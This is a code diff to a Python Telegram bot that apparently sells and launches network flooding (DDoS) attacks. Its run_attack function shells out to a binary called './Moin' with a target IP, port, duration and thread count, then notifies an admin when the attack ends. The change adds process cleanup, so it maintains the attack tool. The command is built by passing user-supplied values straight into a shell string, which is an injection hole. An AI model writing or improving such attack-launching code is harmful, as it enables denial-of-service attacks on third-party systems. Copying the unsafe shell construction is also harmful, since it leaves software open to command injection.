@@ -83,14 +83,19 @@ def handle_redeem(message):
 async def run_attack(target_ip, target_port, duration):
     global attack_in_progress
     attack_in_progress = True
+    process = None
     try:
         process = await asyncio.create_subprocess_shell(f"./Moin {target_ip} {target_port} {duration} 40")
         await process.communicate()
-        bot.send_message(ADMIN_USER_ID, f"🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
+        bot.send_message(ADMIN_USER_ID, f"🛑 𝘼𝙏𝙏𝙰𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
     except Exception as e:
         logging.error(f"Error during attack: {e}")
     finally:
         attack_in_progress = False
+        if process:
+            process.terminate()
+            await process.wait()
+
 
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
